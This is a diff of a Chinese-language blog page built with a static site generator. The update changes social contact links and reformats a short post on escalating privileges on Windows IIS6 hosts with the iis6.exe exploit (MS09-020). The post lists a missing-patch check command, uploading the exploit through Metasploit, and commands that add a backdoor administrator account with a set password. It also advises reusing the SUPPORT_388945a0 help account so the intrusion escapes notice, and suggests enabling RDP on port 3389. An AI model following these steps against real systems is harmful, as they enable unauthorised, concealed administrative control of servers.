@@ -183,11 +183,17 @@
                     <nav class="header-nav">
                         <ul class="social">
                             
-                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                                <a class="fa Email" href="mailto:244567547@qq.com" title="Email"></a>
                             
-                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                                <a class="fa GitHub" href="https://github.com/forever-sky" title="GitHub"></a>
                             
                                 <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa CSDN" href="https://blog.csdn.net/qq_42188168" title="CSDN"></a>
+                            
+                                <a class="fa QQ" href="/244567547" title="QQ"></a>
+                            
+                                <a class="fa 微信" href="/qwer49476600" title="微信"></a>
                             
                         </ul>
                     </nav>
@@ -265,11 +271,17 @@
             <nav class="header-nav">
                         <ul class="social">
                             
-                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                                <a class="fa Email" target="_blank" href="mailto:244567547@qq.com" title="Email"></a>
                             
-                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                                <a class="fa GitHub" target="_blank" href="https://github.com/forever-sky" title="GitHub"></a>
                             
                                 <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa CSDN" target="_blank" href="https://blog.csdn.net/qq_42188168" title="CSDN"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="/244567547" title="QQ"></a>
+                            
+                                <a class="fa 微信" target="_blank" href="/qwer49476600" title="微信"></a>
                             
                         </ul>
             </nav>
@@ -306,7 +318,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">193字</span>
+        <span class="post-count">188字</span>
       </span>
     </span>
 
@@ -339,12 +351,12 @@
           
         <p><strong>iis6.exe溢出提权针对有iis6服务的主机</strong></p>
 <a id="more"></a>
-<h2 id="一、针对有iis6服务的主机"><a href="#一、针对有iis6服务的主机" class="headerlink" title="一、针对有iis6服务的主机"></a>一、针对有iis6服务的主机</h2><h2 id="1、首先探测补丁情况"><a href="#1、首先探测补丁情况" class="headerlink" title="1、首先探测补丁情况"></a>1、首先探测补丁情况</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Temp\temp.txt&amp;(<span class="keyword">for</span> %i <span class="keyword">in</span> (KB3124280 KB3143141 KB3134228 KB3079904 KB3077657 KB3124280 KB3045171 KB2829361 KB3000061 KB2850851 KB2707511 KB970483 KB2124261 KB2271195) do @type C:\Windows\Temp\temp.txt|@find /i <span class="string">"%i"</span>|| @echo %i Not Installed!)&amp;<span class="keyword">del</span> /f /q /a C:\Windows\Temp\temp.txt</span><br></pre></td></tr></table></figure>
+<h1 id="针对有iis6服务的主机"><a href="#针对有iis6服务的主机" class="headerlink" title="针对有iis6服务的主机"></a>针对有iis6服务的主机</h1><h2 id="首先探测补丁情况"><a href="#首先探测补丁情况" class="headerlink" title="首先探测补丁情况"></a>首先探测补丁情况</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Temp\temp.txt&amp;(<span class="keyword">for</span> %i <span class="keyword">in</span> (KB3124280 KB3143141 KB3134228 KB3079904 KB3077657 KB3124280 KB3045171 KB2829361 KB3000061 KB2850851 KB2707511 KB970483 KB2124261 KB2271195) do @type C:\Windows\Temp\temp.txt|@find /i <span class="string">"%i"</span>|| @echo %i Not Installed!)&amp;<span class="keyword">del</span> /f /q /a C:\Windows\Temp\temp.txt</span><br></pre></td></tr></table></figure>
 <p>KB952004 MS09-012        PR    -pr.exe<br>KB956572 MS09-012        巴西烤肉<br>KB970483 MS09-020        IIS6溢出     -iis6.exe</p>
-<h2 id="2、上传iis6-exe到目标主机"><a href="#2、上传iis6-exe到目标主机" class="headerlink" title="2、上传iis6.exe到目标主机"></a>2、上传iis6.exe到目标主机</h2><p>msf使用upload命令</p>
-<h2 id="3、使用iis6-exe提权"><a href="#3、使用iis6-exe提权" class="headerlink" title="3、使用iis6.exe提权"></a>3、使用iis6.exe提权</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iis6.exe <span class="string">"query user"</span>	//查看运行中的用户</span><br><span class="line">iis6.exe <span class="string">"net user skye !@#123 /add"</span></span><br><span class="line">iis6.exe <span class="string">"net localgroup administrators skye /add"</span></span><br><span class="line"></span><br><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>
+<h2 id="上传iis6-exe到目标主机"><a href="#上传iis6-exe到目标主机" class="headerlink" title="上传iis6.exe到目标主机"></a>上传iis6.exe到目标主机</h2><p>msf使用upload命令</p>
+<h2 id="使用iis6-exe提权"><a href="#使用iis6-exe提权" class="headerlink" title="使用iis6.exe提权"></a>使用iis6.exe提权</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iis6.exe <span class="string">"query user"</span>	//查看运行中的用户</span><br><span class="line">iis6.exe <span class="string">"net user skye !@#123 /add"</span></span><br><span class="line">iis6.exe <span class="string">"net localgroup administrators skye /add"</span></span><br><span class="line"></span><br><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>
 <p>这里建议修改帮助账号的密码，并添加至管理员组(SUPPOTR_388945a0)，不容易被发现</p>
-<h2 id="4、之后可以上传3389-bat开启3389端口进行连接"><a href="#4、之后可以上传3389-bat开启3389端口进行连接" class="headerlink" title="4、之后可以上传3389.bat开启3389端口进行连接"></a>4、之后可以上传3389.bat开启3389端口进行连接</h2>
+<h2 id="之后可以上传3389-bat开启3389端口进行连接"><a href="#之后可以上传3389-bat开启3389端口进行连接" class="headerlink" title="之后可以上传3389.bat开启3389端口进行连接"></a>之后可以上传3389.bat开启3389端口进行连接</h2>
       
     </div>
     
@@ -391,7 +403,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、针对有iis6服务的主机"><span class="toc-number">1.</span> <span class="toc-text">一、针对有iis6服务的主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1、首先探测补丁情况"><span class="toc-number">2.</span> <span class="toc-text">1、首先探测补丁情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、上传iis6-exe到目标主机"><span class="toc-number">3.</span> <span class="toc-text">2、上传iis6.exe到目标主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、使用iis6-exe提权"><span class="toc-number">4.</span> <span class="toc-text">3、使用iis6.exe提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、之后可以上传3389-bat开启3389端口进行连接"><span class="toc-number">5.</span> <span class="toc-text">4、之后可以上传3389.bat开启3389端口进行连接</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#针对有iis6服务的主机"><span class="toc-number">1.</span> <span class="toc-text">针对有iis6服务的主机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#首先探测补丁情况"><span class="toc-number">1.1.</span> <span class="toc-text">首先探测补丁情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传iis6-exe到目标主机"><span class="toc-number">1.2.</span> <span class="toc-text">上传iis6.exe到目标主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用iis6-exe提权"><span class="toc-number">1.3.</span> <span class="toc-text">使用iis6.exe提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#之后可以上传3389-bat开启3389端口进行连接"><span class="toc-number">1.4.</span> <span class="toc-text">之后可以上传3389.bat开启3389端口进行连接</span></a></li></ol></li></ol>
         
     </div>
     <style>
